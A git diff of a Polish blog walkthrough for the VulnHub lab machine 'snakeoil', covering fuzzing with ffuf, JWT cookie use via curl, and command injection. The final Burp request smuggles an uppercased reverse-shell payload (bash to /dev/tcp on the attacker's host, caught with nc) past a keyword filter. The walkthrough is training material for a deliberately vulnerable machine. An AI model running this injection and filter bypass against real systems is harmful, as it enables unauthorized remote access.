@@ -26,6 +26,15 @@ gallery6_7:
   - url: /assets/images/hacking/2021/10/07.png
     image_path: /assets/images/hacking/2021/10/07.png
 ---
+
+|:----|:----|
+|Nazwa:|digitalworld.local: snakeoil|
+|Autor:|[Donavan](https://www.vulnhub.com/author/donavan,601/)|
+|Wypuszczony:|23.08.2021|
+|Do ściągnięcia:|[Stąd](https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738) - Vulnhub|
+|Poziom:|Łatwy|
+|Nauczysz się:|Metasploit, JSON, Tokeny|
+
 # Wstęp
 [digitalworld.local: snakeoil](https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/) jest ciekawą i nieszablonową maszyną z paru powodów: wykorzystane są tokeny **JWT** (JSON Web Token), format **JSON** (JavaScript Object Notation), możemy na niej przećwiczyć metody **HTTP** typu **GET**, **POST** w popularnych programach. Przećwiczymy to na trzech: tekstowy [Curl](https://curl.se/download.html) - link jest tutaj w sumie zbędny, posiada go chyba każde repozytorium, ale podaje dla formalności; drugim programem będzie [Burp Suite](https://portswigger.net/burp) i trzecim, który ostatnio wpadł mi w oko będzie [Postman](https://www.postman.com/), który znalazłem na [YouTube](https://www.youtube.com/watch?v=RqqRScUwNlA). Tam też jest instrukcja, jak przejść **Snakeoil**. Ale zrobimy to po swojemu i się skupimy głównie na programach, które wyżej wymieniłem.
 {: .text-justify}
@@ -58,8 +67,8 @@ Po przeskanowaniu wirtualki, widzimy że są otwarte trzy porty. Ten co będzie 
 ## Ffuf
 **Ffuf** czyli **Fuzz Faster U Fool** jest bardzo szybkim fuzzerem bez natłoku funkcji. Wg. mnie ma wszystko co jest potrzebne. Zamiast **Dirb** lub **GoBuster** w tym artykule do skanowania użyjemy tylko powyższego fuzzera.
 {: .text-justify}
-```console
-root@kali:/home/szikers# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.16.1.141:8080/FUZZ -mc all -fc 404
+```bash
+# root@kali:/home/szikers# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.16.1.141:8080/FUZZ -mc all -fc 404
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -110,8 +119,8 @@ Prawdę mówiąc w tym wypadku **Dirb** dałby taki sam wynik, ale we **Ffuf** m
 ### curl
 Widzimy, że kod powrotu dla **login** wynosi **405**, więc **GET** jest w tym wypadku niedozwoloną metodą. Uruchamiając program **Curl** z parametrem **-I** widzimy, że metodami, które można użyć są **OPTIONS** i **POST**:
 {: .text-justify}
-```console
-root@kali:/home/szikers# curl -I http://172.16.1.141:8080/login
+```bash
+# root@kali:/home/szikers# curl -I http://172.16.1.141:8080/login
 HTTP/1.1 405 METHOD NOT ALLOWED
 Server: nginx/1.14.2
 Date: Tue, 14 Sep 2021 20:56:52 GMT
@@ -122,14 +131,14 @@ Allow: OPTIONS, POST
 ```
 Spróbujmy coś zrobić z **POST**:
 {: .text-justify}
-```console
-root@kali:/home/szikers# curl -X POST  http://172.16.1.141:8080/login
+```bash
+# root@kali:/home/szikers# curl -X POST  http://172.16.1.141:8080/login
 {"message": {"username": "Username field cannot be blank."}}
 ```
 Już lepiej, mamy odpowiedź, że pole **username** nie może być puste.
 {: .text-justify}
-```console
-root@kali:/home/szikers# curl -X POST -H "Content-Type: application/json" -d '{"username":"snackoil"}' http://172.16.1.141:8080/login
+```bash
+# root@kali:/home/szikers# curl -X POST -H "Content-Type: application/json" -d '{"username":"snackoil"}' http://172.16.1.141:8080/login
 {"message": {"password": "Password field cannot be blank."}}
 ```
 Teraz mamy odpowiedź, że hasło nie może być puste. Kontynuujmy tę przepychankę w programie **Postman**.
@@ -153,19 +162,20 @@ Wróćmy na chwilę do **Curl**a, ale nie zamykajmy jeszcze okna w **Burp Suite*
 
 Wynika z tego, że musimy podać klucz w ciasteczku (jak to zabrzmiało :smiley: ) i wysłać na serwer:
 {: .text-justify}
-```console
-root@kali:/home/szikers# curl --cookie "access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYzMTczNDE4NywianRpIjoiZjU4NDNhMmUtOTYzOC00NTFlLTg2NDktOTczMGQzNGUzZmUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InNuYWNrb2lsIiwibmJmIjoxNjMxNzM0MTg3LCJleHAiOjE2MzE3MzUwODd9.18oenH8p5IsRYLes02qLICWh_wAYXvCxaVib_H-hbmQ"  http://172.16.1.141:8080/secret
+```bash
+# root@kali:/home/szikers# curl --cookie "access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYzMTczNDE4NywianRpIjoiZjU4NDNhMmUtOTYzOC00NTFlLTg2NDktOTczMGQzNGUzZmUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InNuYWNrb2lsIiwibmJmIjoxNjMxNzM0MTg3LCJleHAiOjE2MzE3MzUwODd9.18oenH8p5IsRYLes02qLICWh_wAYXvCxaVib_H-hbmQ"  http://172.16.1.141:8080/secret
 {"ip-address": "", "secret_key": "commandexecutionissecret"}
 ```
 ### Burp Suite
 Mamy nasz sekretny klucz. Parametr **"url"** jest podatny na **command injection**. Niestety, nie możemy wrzucić stringów typu: **bash**, **/dev/tcp**, bo dostajemy bana. Skrypt na serwerze od razu filtruje te słowa, ale możemy zrobić coś innego. Wrzucić klucz publiczny **id_rsa.pub** do katalogu **.ssh**, jak to zrobił na filmiku **InfoSecLab**, albo tak przerobić nasz tekst żeby przeszedł filtry. Zrobimy to drugie. Stworzymy **payload**, który się będzie łączył na port **12345**, ale żeby to zadziałało, to najpierw małe litery w naszym ładunku zamienimy na duże, wrzucimy to wszystko do pliku, potem odwrócimy wielkość liter i uruchomimy nasz skrypt. Oczywiście można to inaczej zrobić, żeby zadziałało. Np. zakodować plik do **MD5**, potem odkodować, itd... ale zanim wrzucimy nasz ładunek, trzeba włączyć na naszym serwerze nasłuchiwanie na porcie **12345**.
 {: .text-justify}
 ```bash
-nc -lvp 12345
+# nc -lvp 12345
 ```
 A w naszym nagłówku umieszczamy takie coś:
 {: .text-justify}
-```console
+<pre>
+<p style="background-color:white;">
 POST /run HTTP/1.1
 Host: 172.16.1.141:8080
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -182,7 +192,8 @@ Content-Length: 227
 "url":"--help >/dev/null ; echo '#!/BIN/BASH' >1.sh; echo 'BASH -i > /DEV/TCP/172.16.1.10/12345 0>&1 2>&1' >> 1.sh; tr [:upper:] [:lower:] <1.sh > 2.sh; chmod +x 2.sh; ./2.sh ;",
 "secret_key":"commandexecutionissecret"
 }
-```
+</p>
+</pre>
 # Koniec
 Wysyłamy nagłówek i jesteśmy na **patrick@SNAKEOIL**. Na koniec podpowiem, że interesuje nas plik **flask_blog/app.py**. Tam znajdziecie co trzeba.
 {: .text-justify}
